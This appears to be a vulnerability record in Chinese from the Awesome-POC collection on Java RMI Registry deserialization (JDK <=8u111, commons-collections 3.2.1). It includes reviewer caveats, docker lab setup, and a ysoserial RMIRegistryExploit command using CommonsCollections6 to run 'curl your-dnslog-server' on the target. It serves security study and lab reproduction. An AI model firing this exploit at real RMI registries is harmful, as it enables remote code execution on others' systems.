---
source: "Threekiii/Awesome-POC"
product: "Java RMI Registry/反序列化"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Java RMI Registry 反序列化漏洞(=jdk8u111)"
prerequisites: "来源所述条件，未列明部分仍待核：正文<=JDK8u111，文件名丢<；需Registry可达、CC3.2.1及合适反序列化链"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-d9cb7916a50f3fc721d279bf"
entity_id: "ve-d9cb7916a50f3fc721d279bf"
schema_version: "1"
canonical: "Web安全/开发框架/Java/Java RMI Registry 反序列化漏洞(=jdk8u111).md"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：正文&lt;=JDK8u111，文件名丢&lt;；需Registry可达、CC3.2.1及合适反序列化链

代码与实验材料：docker环境启动与CC6工具命令，错误可在副作用后出现但错误本身不能证明成功

来源证据范围：Threekiii/Awesome-POC，未给环境目录及JDK补丁来源

- **适用与权限边界（1）**：边界与确认结果不完整；依据：标题&lt;=但文件名=；无固定版本/具体补丁说明，DNS截图未视检；需要目标实际请求或无害产物证明。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Java RMI Registry 反序列化漏洞 (<=jdk8u111)

## 漏洞描述

Java Remote Method Invocation 用于在 Java 中进行远程调用。RMI 存在远程 bind 的功能（虽然大多数情况不允许远程 bind），在 bind 过程中，伪造 Registry 接收到的序列化数据（实现了 Remote 接口或动态代理了实现了 Remote 接口的对象），使 Registry 在对数据进行反序列化时触发相应的利用链（环境用的是 commons-collections:3.2.1）。

## 环境搭建

执行如下命令编译及启动 RMI Registry 和服务器：

```
docker-compose build
docker-compose run -e RMIIP=your-ip -p 1099:1099 rmi
```

其中，`your-ip` 是服务器 IP，客户端会根据这个 IP 来连接服务器。

环境启动后，RMI Registry 监听在 1099 端口。

## 漏洞复现

通过 ysoserial 的 exploit 包中的 RMIRegistryExploit 进行攻击

```bash
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit your-ip 1099 CommonsCollections6 "curl your-dnslog-server"
```

![image-20220224142802160](./.resource/JavaRMIRegistry反序列化漏洞=jdk8u111/media/202202241428503.png)

Registry 会返回报错，但命令会正常执行。可以看到 dnslog 成功接收请求。


---

> 来源：Threekiii/Awesome-POC
